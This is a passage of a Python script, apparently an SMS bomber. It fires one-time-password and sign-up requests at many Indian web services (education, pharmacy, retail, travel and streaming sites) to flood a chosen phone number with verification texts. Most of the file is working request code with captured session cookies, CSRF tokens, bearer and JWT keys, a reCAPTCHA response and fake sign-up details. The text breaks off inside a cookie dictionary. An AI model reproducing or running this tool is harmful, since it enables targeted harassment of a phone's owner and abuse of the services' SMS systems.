import time
import asyncio
import aiohttp
import requests
start= time.time()

def indsms(tarnum: int):
    
    
    async def whitehat(tarnum: int ):
        try:
            
            headers = {
            'authority': 'api.whitehatjr.com',
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/json;charset=UTF-8',
            'origin': 'https://code.whitehatjr.com',
            'referer': 'https://code.whitehatjr.com/',
            'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
            'whjr-amplitude-sessionid': '1688803790709',
            'whjr-segment-anonymousid': 'ce603231-2d29-46c1-82d4-70b1a0a20494',
                }

            params = {
                'deviceId': 'b2477942-81e6-47ba-921d-7d2673862942',
                'timezone': 'Asia/Calcutta',
                'trackingCode': 'trackingCode|AB-11206-V-A|AB-11137-V-A|AB-11184-V-A|AB-11140-V-A|AB-11193-V-B|AB-11194-V-B|AB-11176-V-A|AB-11191-V-B|AB-11181-V-B|AB-11183-V-B|AB-11142-V-A|AB-11196-V-A|AB-11156-V-A|AB-11209-V-A|AB-22-V-B|AB-11192-V-A|AB-11152-V-A|AB-29-V-B|AB-11167-V-A|AB-11204-V-A|AB-11188-V-A|AB-11150-V-B|AB-24-V-C|AB-11163-V-A|AB-13-V-B|AB-11155-V-A|AB-11208-V-B|AB-11186-V-A|AB-11201-V-B|AB-26-V-B|AB-11136-V-A|AB-11195-V-A|AB-11161-V-A|AB-11202-V-A|AB-31-V-A|AB-18-V-A|AB-11210-V-B|AB-11200-V-A|AB-11153-V-B|AB-11154-V-A|AB-11175-V-A|AB-11198-V-A|AB-11159-V-A|AB-11165-V-A|AB-15-V-A|AB-34-V-A|AB-11160-V-B|AB-28-V-B|AB-11169-V-B|AB-25-V-B|AB-11164-V-A|AB-11135-V-A|AB-21-V-C|AB-11182-V-A|AB-17-V-A|AB-37-V-B|AB-23-V-C|AB-12-V-A|AB-11151-V-B|AB-27-V-B|AB-11166-V-A',
                'regionId': 'IN',
                'courseType': 'ALL',
                'brandId': 'whitehatjr',
                'timestamp': '1688803828654',
                '_vercel_no_cache': '1',
                    }

            json_data = {
                'dialCode': '+91',
                'mobile': f'{tarnum}',
                'g-recaptcha-response': '03AAYGu2RQ3WrKIPmFVc_CZyy2gqAgKAc5h3YubYhzlr_VXjKpWjnIlEZ2ij1SZ68Hx6JOP1waWARsDHRJ0PVUpYJUAhmEZXgcRLQMY57DQkzDgez8PQ8P2Ia4Vc47q-AMqVUS2eWLwzuNos8JBUUP0RFC87m3d2ROeViR6IsseygK5ft-w5q-WtUkqUvYywwHtCmApTTmdBMgVbsbTpnX5cRkRSriW3yqG7heX2S2TiPsF377BAL5UGUQmjP93CwUdn8Bf2hhXq60xP77LXoVEvAsOZKxUDmVbf5DqXkWU8w_cSS_ZiIpRjw2xKzRUAj_GZB0s03ZPrewTzbGc3JtY7BKd6TtqNmcQ6CiadK0relg-ccZsLjiIe85KSoFBZfSH9ZeL3PECO3d4GLwHQjxwUNpeF_DB0rFMmT2nWSoyh0RnBGQpF5JkZfzEHuRDEN7jOS1xS_TpmidLkBZP18UWGZNN_tBl0_8nwFpe08uFQ6cqxyvM92sCEyZCoY13a4ZamoRSPBBam3ZK5KPmX_sUhROXrNql_PK6lJd_xA1JAJij7yKP-wYQWKFanKM8dUeldLxyAMg2RhQ',
                    }
            async with aiohttp.ClientSession() as sess:
                async with sess.post('https://api.whitehatjr.com/api/V1/otp/generate', params=params, headers=headers, json=json_data) as response:
                    print(response.text)
             
            return "done"
        except Exception as e:
            return "failed"
    
    async def unacademy(tarnum: int ):
        try:
            params = {
                'enable-email': 'true',
                    }

            json_data = {
                'phone': f'{tarnum}',
                'country_code': 'IN',
                'otp_type': 1,
                'email': '',
                'send_otp': True,
                'is_un_teach_user': False,
                    }
            async with aiohttp.ClientSession() as sess:
                async with sess.post(
                'https://unacademy.com/api/v3/user/user_check/',
                params=params,
                json=json_data,
                    ) as response:
                    print(response.text)
            return "done"
        except Exception as e:
            return "failed"
    async def apollo247(tarnum: int ):
        try:
            headers = {
                'authority': 'api.apollo247.com',
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'authorization': 'Bearer 3d1833da7020e0602165529446587434',
                'content-type': 'application/json',
                'origin': 'https://www.apollopharmacy.in',
                'referer': 'https://www.apollopharmacy.in/',
                'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
                'x-apollo-pre-auth-key': 'eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZGVudGlmaWVyIjoiYmIzNWVhNGZlZjM3NTBlNjU1OTk0ZWZjNDJmOTZiMDFkMjllZWE4ZDVlYjhkMWFhZmQyZWYwY2Y5MDY5ZTE5OSIsImlzc3VlZEF0IjoiMjAyMy0wNy0wOFQxNTozMDoyNS4xNjRaIiwiZGV2aWNlSWQiOiJEZXNrdG9wIiwiaWF0IjoxNjg4ODMwMjI1LCJleHAiOjE2ODg5MTY2MjUsImlzcyI6IkFwb2xsbzI0NyJ9.BndnC-Aserh-OYXVtpIyiKdIB06qrVipWXUMUFu2DUpVpm30FUsz62MWI5VxdzyfuKu8yT0HQhYYnNvjhRJZX-FZ-T84iRbjoV6hp9DnpRfV2rw3dip0_NprZE8Qrxam8OUETivTRIA1nX5l7888xxt-kuPWdR3X74z8G-4e4QnV6DJkkrqjLoZRf3tPd7qlBPzVnE1ZcdR4BJSVqjlSjiQ3ObHmJMpuK4om8YFBvzt_HQ9JtgA_xpgHWADenr5UlpbMz_WgOclG8aOnoU-Wrfiq0nKWhEbzqk6cfjJ_1xPMFV0H2P_acPTtqPwWbkt36QS1aOyMuZWKaf6FH1nD6g',
                'x-app-device-id': 'Desktop',
                'x-app-os': 'web',
            }

            json_data = {
                'operationName': 'Login',
                'variables': {
                    'mobileNumber': f'+91{tarnum}',
                    'loginType': 'PATIENT',
                },
                'query': 'query Login($mobileNumber: String!, $loginType: LOGIN_TYPE!) {\n  login(mobileNumber: $mobileNumber, loginType: $loginType) {\n    status\n    message\n    loginId\n    __typename\n  }\n}\n',
            }
            async with aiohttp.ClientSession() as sess:
                async with sess.post('https://api.apollo247.com/', headers=headers, json=json_data) as response:
                    print(response.text)
            return "done"
        except Exception as e:
            return "failed"  

    async def mg1(tarnum: int ):
        try:
            json_data = {
                'number': f'{tarnum}',
                'is_corporate_user': False,
                'is_doctor': False,
            }
            async with aiohttp.ClientSession() as sess:

                async with sess.post('https://www.1mg.com/auth_api/v6/create_token',json=json_data) as response:

                    print(response.text)
            return "done"
        except Exception as e:
            return "failed" 

    async def textbook(tarnum: int ):
        try:
            json_data = {}
            async with aiohttp.ClientSession() as sess:

                async with sess.post(
                f'https://api.testbook.com/api/v2/otp/send?emailOrMobile={tarnum}&resend=true',
                json=json_data,
            ) as response:
            
                    print(response.text)
            return "done"
        except Exception as e:
            return "failed"
    async def tendercut(tarnum: int ):
        try:

            json_data = {
                'mobile': f'{tarnum}',
                'otp_mode': 'SIGNUP',
            }
            async with aiohttp.ClientSession() as sess:

                async with sess.post('https://api.tendercuts.in/otp/v2/generate/', json=json_data) as response:
                    print(response.text)
            return "done"
        except Exception as e:
            return "failed"
    async def croma(tarnum: int ):
        try:
            headers = {
                'authority': 'api.tatadigital.com',
                'accept': 'application/json, text/plain, */*',
                'accept-language': 'en-US,en;q=0.9',
                'client_id': 'CROMA-WEB-APP',
                'content-type': 'application/json',
                # 'cookie': 'SESSION=NjBhZjZjYTAtMjc1YS00M2YwLTliOTUtODVmNGRkZDQyODhl',
                'origin': 'https://www.croma.com',
                'referer': 'https://www.croma.com/',
                'sec-ch-ua': '"Microsoft Edge";v="111", "Not(A:Brand";v="8", "Chromium";v="111"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.44',
            }

            json_data = {
                'countryCode': '91',
                'sendOtp': True,
                'phone': f'{tarnum}',
            }
            async with aiohttp.ClientSession() as sess:
                async with sess.post('https://api.tatadigital.com/api/v2/sso/check-phone', headers=headers, json=json_data) as response:
                    print(response.text) 
            return "done"
        except Exception as e:
            return "failed"
        
    async def skecher(tarnum: int ):
        try:
            data = f'dwfrm_profile_customer_phone={tarnum}&phoneLogin=true'.encode()
            async with aiohttp.ClientSession() as sess:

                async with sess.post(
                'https://www.skechers.in/on/demandware.store/Sites-skechersin-Site/default/Account-GenerateOTP',
                data=data,
            ) as response:
                    print(response.text)
            return "done"
        except Exception as e:
            return "failed"
    
    async def dentalcart(tarnum: int ):
        try:
            json_data = {
                'operationName': 'createAccountOTP',
                'variables': {
                    'mobileNumber': f'{tarnum}',
                    'websiteId': 1,
                },
                'query': 'mutation createAccountOTP($mobileNumber: String, $websiteId: Int) {\n  createAccountOTP(mobileNumber: $mobileNumber, websiteId: $websiteId) {\n    status\n    message\n    __typename\n  }\n}\n',
            }
            async with aiohttp.ClientSession() as sess:
                async with sess.post('https://api-apollo.dentalkart.com/graphql', json=json_data) as response:
                    print(response.text)
            return "done"
        except Exception as e:
            return "failed"
    async def lybra(tarnum: int ):
        try:
            cookies = {
                'suid': '32d9eae9-15a8-416c-a213-ecd85c73aac2',
                'est': '"utm_source=DIRECT|"',
                '_fbp': 'fb.1.1687032393419.197738972',
                'we_luid': '497887c5f56e1f24af6c5ff8e278f3867cd4952d',
                '_gcl_au': '1.1.1905491817.1688837339',
                'JSESSIONID': 'A0392EE42409FC62F86BA3B40F0C7BBA',
                'countryCode': 'IN',
                'latitude': '28.6667',
                'longitude': '77.2167',
                'cityName': 'Delhi',
                'CITY_ID': '143',
                '_gid': 'GA1.2.115065910.1689274677',
                '_gat': '1',
                '_ga_1T7TVJNDEV': 'GS1.1.1689274679.2.0.1689274679.0.0.0',
                '_ga': 'GA1.1.862002275.1687032393',
                'AWSALB': '30LXHhNA5xDR0JaErQo3ezmSRSvJ/IncQkpYJL8PM9BGpxM1mZhbvXHhNiABs0Z6hy3DjapSiGNOxSARApXqRNaev1cAqVobrAWpvc9vcc0kkLIFZCXF+vum/7Q2',
                'AWSALBCORS': '30LXHhNA5xDR0JaErQo3ezmSRSvJ/IncQkpYJL8PM9BGpxM1mZhbvXHhNiABs0Z6hy3DjapSiGNOxSARApXqRNaev1cAqVobrAWpvc9vcc0kkLIFZCXF+vum/7Q2',
            }

            json_data = {
                'countryCode': 'IN',
                'firstName': 'bvfhsfgh',
                'mobile': f'{tarnum}',
                'password': '17094525',
                'email': 'jnjfdd@gmail.com',
            }
            async with aiohttp.ClientSession() as sess:
                async with sess.post('https://www.lybrate.com/p/login-signup', cookies=cookies,json=json_data)as response:
                    print(response.text)
            return "done"
        except Exception as e:
            return "failed"
    async def decathon(tarnum: int ):
        try:
            json_data = {
                'param': f'{tarnum}',
                'source': 1,
            }
            async with aiohttp.ClientSession() as sess:
                async with sess.post('https://www.decathlon.in/api/login/sendotp', json=json_data) as response:
                    print(response.text)
            return "done"
        except Exception as e:
            return "failed"
    
    async def trainman(tarnum: int ):
        try:
            headers = {
                'authority': 'www.trainman.in',
                'accept': 'application/json, text/plain, */*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'multipart/form-data; boundary=----WebKitFormBoundarym9QS2xBGu82M0ZOU',
                # 'cookie': '_fbp=fb.1.1678101239525.1621469544; _gid=GA1.2.930425739.1678101243; _gat_gtag_UA_99163760_1=1; _ga_HM91Q9LTGY=GS1.1.1678101243.1.1.1678101249.54.0.0; _ga=GA1.2.1612900361.1678101243; _gcl_au=1.1.1069742548.1678101250',
                'origin': 'https://www.trainman.in',
                'referer': 'https://www.trainman.in/auth/account',
                'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Microsoft Edge";v="110"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.63',
            }

            params = {
                'key': '012562ae-60a9-4fcd-84d6-f1354ee1ea48',
                'timestamp': '1678101261969',
            }

            data = f'------WebKitFormBoundarym9QS2xBGu82M0ZOU\r\nContent-Disposition: form-data; name="phone"\r\n\r\n{tarnum}\r\n------WebKitFormBoundarym9QS2xBGu82M0ZOU\r\nContent-Disposition: form-data; name="email"\r\n\r\n\r\n------WebKitFormBoundarym9QS2xBGu82M0ZOU\r\nContent-Disposition: form-data; name="name"\r\n\r\n\r\n------WebKitFormBoundarym9QS2xBGu82M0ZOU--\r\n'.encode()
            async with aiohttp.ClientSession() as sess:
                async with sess.post('https://www.trainman.in/services/user/signup', params=params,headers=headers, data=data) as response:
                    print(response.text)
            return "done"
        except Exception as e:
            return "failed"
        
    async def redbus(tarnum: int ):
        try:
            json_data = {
                'mobileNo': f'{tarnum}',
                'phoneCode': '91',
            }
            async with aiohttp.ClientSession() as sess:

                async with sess.post('https://www.redbus.in/help/api/cx/generateOtp',json=json_data) as response:
                    print(response.text)
            return "done"
        except Exception as e:
            return "failed"

    async def confirm(tarnum: int ):
        try:
            async with aiohttp.ClientSession() as sess:

                async with sess.get(
                f'https://securedapi.confirmtkt.com/api/platform/registerOutput?mobileNumber={tarnum}&newOtp=true&retry=false&testparamsp=true'
                ) as response:
                    print(response.text)
            return "done"
        except Exception as e:
            return "failed"
        
    async def physics(tarnum: int ):
        try:
            params = {
                'smsType': '0',
            }

            json_data = {
                'mobile': f'{tarnum}',
                'organizationId': '5eb393ee95fab7468a79d189',
            }
            async with aiohttp.ClientSession() as sess:
                async with sess.post('https://api.penpencil.co/v1/users/resend-otp', params=params,json=json_data) as response:
                    print(response.text)
            return "done"
        except Exception as e:
            return "failed"
        
    async def upgrade(tarnum: int ):
        try:
            json_data = {
                'phoneNumber': f'+91{tarnum}',
            }
            async with aiohttp.ClientSession() as sess:

                async with sess.post('https://prod-auth-api.upgrad.com/apis/auth/v5/registration/phone', json=json_data) as response:
                    print(response.text)
            return "done"
        except Exception as e:
            return "failed"
        
    async def vedantu(tarnum: int ):
        try:
            json_data = {
                'email': None,
                'phoneCode': '+91',
                'phoneNumber': f'{tarnum}',
                'version': 2,
                'ver': '12.336',
            }
            async with aiohttp.ClientSession() as sess:

                async with sess.post('https://user.vedantu.com/user/preLoginVerification', json=json_data) as response:
                    print(response.text)
            return "done"
        except Exception as e:
            return "failed"
        
    async def doubtnut(tarnum: int ):
        try:
            headers = {
                'authority': 'api.doubtnut.com',
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://www.doubtnut.com',
                'referer': 'https://www.doubtnut.com/',
                'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
                'version_code': '1500',
            }

            data = f'phone_number={tarnum}&is_web=3'.encode()
            async with aiohttp.ClientSession() as sess:
                async with sess.post('https://api.doubtnut.com/v4/student/login', headers=headers, data=data) as response:
                    print(response.text)
            return "done"
        except Exception as e:
            return "failed"
        
    async def zee5(tarnum: int ):
        try:
            headers = {
                'Accept': 'application/json',
                'Accept-Language': 'en-US,en;q=0.9',
                'Connection': 'keep-alive',
                'Content-Type': 'application/json',
                'Origin': 'https://www.zee5.com',
                'Referer': 'https://www.zee5.com/',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-site',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
                'device_id': '0afpDz7hZuUJl38J9bWD000000000000',
                'esk': 'MGFmcER6N2hadVVKbDM4SjliV0QwMDAwMDAwMDAwMDBfX2dCUWFaTGlOZEdOOVVzQ0taYWxvZ2h6OXQ5U3RXTFNEX18xNjc2NzU1NDI1ODI3',
                'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
            }

            json_data = {
                'phoneno': f'91{tarnum}',
            }
            async with aiohttp.ClientSession() as sess:
                async with sess.post('https://auth.zee5.com/v1/user/sendotp', headers=headers, json=json_data) as response:
                    print(response.text)
            return "done"
        except Exception as e:
            return "failed"
        
    async def ballebazi(tarnum: int ):
        try:
            json_data = {
                'phone': f'{tarnum}',
            }
            async with aiohttp.ClientSession() as sess:
                async with sess.post('https://bbapi.ballebaazi.com/users/applink',json=json_data) as response:
                    print(response.text)
            return "done"
        except Exception as e:
            return "failed"
    async def byjus(tarnum: int ):
        try:
            json_data = {
                'tel': f'+91{tarnum}',
                'deviceType': 'web',
            }
            async with aiohttp.ClientSession() as sess:

                async with sess.post('https://webapi.byjusexamprep.com/user/verify/sendOtp', json=json_data) as response:
                    print(response.text)
            return "done"
        except Exception as e:
            return "failed"
        
    async def dunzo(tarnum: int ):
        try:
            cookies = {
                'dz_e': 'YTAzOWIzNjMtNDU2MC00NDI1LWJjMjMtNDU5NTM4NTZkOGEwX3Yx',
                'connect.sid': 's%3AJ-kk0fo5a3k_5q21n9c1bP03KbvEqEYm.BnId9YBG52aj3D5X7S4bkTK99V0LgRFjrv7y3kBlfAc',
                '_gcl_au': '1.1.280736843.1676728602',
                '_gid': 'GA1.2.1103936861.1676728602',
                'WZRK_G': '438a8b6b3354443d8c4b2533883f6ebf',
                '_fbp': 'fb.1.1676728602565.1956882044',
                '__cf_bm': 'bSeV_LBqdbJamEYB6Dcv8XtnyO.sMTiA9B4z9qwWmho-1676762323-0-AQyYz/u5BhdtVYzbIRXt9gsAcnrc5kP7v3IXfwTQ/hEoaEarkiULYPjsqKxBMTD1AR5CrDIy35erR1EfTFwgfxI=',
                '__cfruid': '6dbb5c76baae2a6cc72f7216b2b1a1b3aed91b29-1676762323',
                '_gat_UA-74154936-4': '1',
                '_ga': 'GA1.1.563334689.1676728602',
                '_ga_MH9JSX933B': 'GS1.1.1676762173.2.0.1676762173.0.0.0',
                'WZRK_S_46R-KR9-WZ5Z': '%7B%22p%22%3A1%2C%22s%22%3A1676762324%2C%22t%22%3A1676762194%7D',
            }

            headers = {
                'authority': 'www.dunzo.com',
                'accept': 'application/json, text/plain, */*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/json;charset=UTF-8',
                # 'cookie': 'dz_e=YTAzOWIzNjMtNDU2MC00NDI1LWJjMjMtNDU5NTM4NTZkOGEwX3Yx; connect.sid=s%3AJ-kk0fo5a3k_5q21n9c1bP03KbvEqEYm.BnId9YBG52aj3D5X7S4bkTK99V0LgRFjrv7y3kBlfAc; _gcl_au=1.1.280736843.1676728602; _gid=GA1.2.1103936861.1676728602; WZRK_G=438a8b6b3354443d8c4b2533883f6ebf; _fbp=fb.1.1676728602565.1956882044; __cf_bm=bSeV_LBqdbJamEYB6Dcv8XtnyO.sMTiA9B4z9qwWmho-1676762323-0-AQyYz/u5BhdtVYzbIRXt9gsAcnrc5kP7v3IXfwTQ/hEoaEarkiULYPjsqKxBMTD1AR5CrDIy35erR1EfTFwgfxI=; __cfruid=6dbb5c76baae2a6cc72f7216b2b1a1b3aed91b29-1676762323; _gat_UA-74154936-4=1; _ga=GA1.1.563334689.1676728602; _ga_MH9JSX933B=GS1.1.1676762173.2.0.1676762173.0.0.0; WZRK_S_46R-KR9-WZ5Z=%7B%22p%22%3A1%2C%22s%22%3A1676762324%2C%22t%22%3A1676762194%7D',
                'correlation-id': '4d805880afe211ed8f1797d73bb0a42f',
                'origin': 'https://www.dunzo.com',
                'referer': 'https://www.dunzo.com/delhi',
                'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'x-app-flavour': '',
                'x-app-type': 'PWA_WEB',
                'x-app-version': '2.0.0',
                'x-csrf-token': 'MCVoy4ET-I18Jva1CJx9lZyB82ZzZ_KwYEoU',
            }

            json_data = {
                'phone': f'{tarnum}',
                'tos_accepted': True,
            }
            async with aiohttp.ClientSession() as sess:
                async with sess.post('https://www.dunzo.com/api/v0/auth/sign-up', cookies=cookies, headers=headers, json=json_data) as response:
                    print(response.text)
            return "done"
        except Exception as e:
            return "failed"
        
    async def rapido(tarnum: int ):
        try:
            json_data = {
                'mobile': f'{tarnum}',
            }
            async with aiohttp.ClientSession() as sess:
                async with sess.post('https://customer.rapido.bike/api/otp',json=json_data) as response:
                    print(response.text)
            return "done"
        except Exception as e:
            return "failed"
    
    async def gopaysense(tarnum: int ):
        try:
            headers = {
                'authority': 'api.gopaysense.com',
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/json',
                'origin': 'https://www.gopaysense.com',
                'referer': 'https://www.gopaysense.com/',
                'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
            }

            json_data = {
                'phone': f'{tarnum}',
            }
            async with aiohttp.ClientSession() as sess:

                async with sess.post('https://api.gopaysense.com/users/otp', headers=headers, json=json_data) as response:
                    print(response.text)
            return "done"
        except Exception as e:
            return "failed"
        
    async def medibuddy(tarnum: int ):
        try:
            json_data = {
                'source': 'medibuddy',
                'platform': 'medibuddyInWeb',
                'phonenumber': f'{tarnum}',
                'screen': 'login-page',
                'advertiserId': '1052940192611150823',
                'mbUserId': None,
            }
            async with aiohttp.ClientSession() as sess:

                async with sess.post('https://www.medibuddy.in/unified-login/user/register', json=json_data) as response:
                    print(response.text)
            return "done"
        except Exception as e:
            return "failed"
        
    async def moglix(tarnum: int ):
        try:
            json_data = {
                'phone': f'{tarnum}',
                'email': '',
                'type': 'p',
                'source': 'signup',
                'device': 'mobile',
            }
            async with aiohttp.ClientSession() as sess:

                async with sess.get('https://apinew.moglix.com/nodeApi/v1/login/sendOTP', json=json_data) as response:
                    print(response.text)
            return "done"
        except Exception as e:
            return "failed"
        
    async def Xtracover(tarnum: int):
        try:
            data = {
                'mobileno': f'{tarnum}',
                'IsCheckOutUsedSystemOtp': '0',
            }
            async with aiohttp.ClientSession() as sess:
                async with sess.post('https://www.xtracover.com/MyAccount/GetOtpByMobileNo', data=data) as response:
                    print(response.text)
            return "done"
        except Exception as e:
            return "failed"
        
    async def mgy(tarnum: int):
        try:
            params = {
                'dispatch': 'fk_login.register',
            }

            data = {
                'ship_to_another': '1',
                'user_data[firstname]': 'bhjbshjvb',
                'user_data[lastname]': 'cmsv  v',
                'user_data[phone]': f'{tarnum}',
                'user_data[email]': 'ndnvnf@gmail.com',
                'user_data[password1]': '17074502',
                'user_data[password2]': '17074502',
                'security_hash': '53228cf784793b1d89cfb22875c9c530',
                'is_ajax': '1',
            }
            async with aiohttp.ClientSession() as sess:
                async with sess.post('https://www.myg.in/index.php', params=params, data=data) as response:
                    print(response.text)
            return "done"
        except Exception as e:
            return "failed"
        
    async def flyphone(tarnum: int):
        try:
            cookies = {
                'webtype': 'undefined',
                'googtrans': '/en/en',
                'googtrans': '/en/en',
                'NSSESSION': 's%3A5F3M9bQxPYwjWs6sccTs7kELDQ0ymZoS.D9vpeOjw%2BSz5YpqWTB7BZadYQASgBBiG9QYGSqz8q50',
                'PHPWEBSTORESESSION': '5F3M9bQxPYwjWs6sccTs7kELDQ0ymZoS',
                'twk_idm_key': 'a93bTn7z3Qzoos1T_rgPs',
                'TawkConnectionTime': '0',
                'twk_uuid_61268648649e0a0a5cd2eea9': '%7B%22uuid%22%3A%221.SwpLLChOGslHzfjvXF5GksFDS6RycfQKwS0P7bSLHLnW6nLf1NgcYi7V4hVqcBhc66wPveCNJlrIhm966EgS3ww653IVUmCWIn1ukTOysDY2HvAvbb6IC%22%2C%22version%22%3A3%2C%22domain%22%3A%22flyphones.in%22%2C%22ts%22%3A1688927126119%7D',
            }

            headers = {
                'Accept': 'application/json, text/plain, */*',
                'Accept-Language': 'en-US,en;q=0.9',
                'Connection': 'keep-alive',
                'Content-Type': 'application/x-www-form-urlencoded',
                # 'Cookie': 'webtype=undefined; googtrans=/en/en; googtrans=/en/en; NSSESSION=s%3A5F3M9bQxPYwjWs6sccTs7kELDQ0ymZoS.D9vpeOjw%2BSz5YpqWTB7BZadYQASgBBiG9QYGSqz8q50; PHPWEBSTORESESSION=5F3M9bQxPYwjWs6sccTs7kELDQ0ymZoS; twk_idm_key=a93bTn7z3Qzoos1T_rgPs; TawkConnectionTime=0; twk_uuid_61268648649e0a0a5cd2eea9=%7B%22uuid%22%3A%221.SwpLLChOGslHzfjvXF5GksFDS6RycfQKwS0P7bSLHLnW6nLf1NgcYi7V4hVqcBhc66wPveCNJlrIhm966EgS3ww653IVUmCWIn1ukTOysDY2HvAvbb6IC%22%2C%22version%22%3A3%2C%22domain%22%3A%22flyphones.in%22%2C%22ts%22%3A1688927126119%7D',
                'Origin': 'https://www.flyphones.in',
                'Referer': 'https://www.flyphones.in/',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
                'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
            }

            data = {
                'action': 'sendOtp',
                'data': '{"supid":70237,"mobile":"9985410000","from":"signup"}',
            }
            async with aiohttp.ClientSession() as sess:
                async with sess.post(
                'https://www.flyphones.in/functions/market/ajxgrocpharmaction.php',
                cookies=cookies,
                headers=headers,
                data=data,
                ) as response:
                    print(response.text)
                return "done"
        except Exception as e:
            return "failed"
        
    async def tyre(tarnum: int):
        try:
            data = {
                'form_key': 'Ke8B8fC3DlS1v2mD',
                'phone_number': f'{tarnum}',
                'login_type': 'otp',
            }
            async with aiohttp.ClientSession() as sess:
                async with sess.post('https://tyresnmore.com/otplogin/account/otploginpost/', data=data) as response:
                    print(response.text)

                return "done"
        except Exception as e:
            return "failed"  



    async def winni(tarnum: int):
        try:
            data = {
                'email': '',
                'mobile': f'{tarnum}',
                'countryCode': '+91',
                'scrval': '',
                'isvlexst': 'nguTGPa4QPlAKM32kkam1AlamJs39qNpATqNb2s',
            }
            async with aiohttp.ClientSession() as sess:
                async with sess.post('https://www.winni.in/customer/verify-email', data=data) as response:
                    print(response.text)
            return "done"
        except Exception as e:
            return "failed"
    
    async def mrbrown(tarnum: int):
        try:
            cookies = {
                '_gcl_au': '1.1.1957854088.1688927598',
                '_gid': 'GA1.2.1582251896.1688927599',
                '_gat_UA-78924810-1': '1',
                '_clck': '8sn6gz|2|fd5|0|1285',
                '_fbp': 'fb.1.1688927600216.1704611332',
                'delpin': '110001',
                'XSRF-TOKEN': 'eyJpdiI6IjZRbzJ0V2s3VEJEUHJTUlZJZGVLMmc9PSIsInZhbHVlIjoiN0p2UDd1N3JBMTVrWkdYdmMyNVZaMDlPV2xqQUtYN2NjRGFrVWJkaTVadUQrWHJCSlpvaUptM3RLTnQzQ0g2byIsIm1hYyI6IjI5ZDhjMzg2MjJmOTc1OTI3NmJmZmRiNzBjOThhODc0YzEwNGQ3MWI4Mjg4NDVkOGUwZjMxMjUzNWJlMzM2YmQifQ%3D%3D',
